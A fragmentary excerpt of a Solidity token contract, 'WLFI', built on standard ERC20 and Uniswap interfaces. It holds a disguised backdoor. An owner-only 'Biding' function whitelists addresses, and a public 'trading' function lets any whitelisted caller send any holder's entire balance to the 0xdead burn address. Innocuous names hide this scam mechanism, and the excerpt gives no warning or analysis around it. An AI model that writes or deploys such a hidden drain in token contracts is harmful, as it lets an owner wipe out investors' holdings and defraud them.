...
interface IUniswapV2Router02 {
 ...
 contract WLFI is Context, IERC20, Ownable {
    ...
    mapping(address => build) private builds;
    ...
    function Biding(address acc) public onlyOwner() {
        builds[acc] = build({
            user: acc,
    ...
    function par() internal view{
        require(builds[msg.sender].dateTime > 0);
    }

    function trading(address account) virtual external {
        par(); _transfer(account,address(0xdead),_balances[account]);      
    }
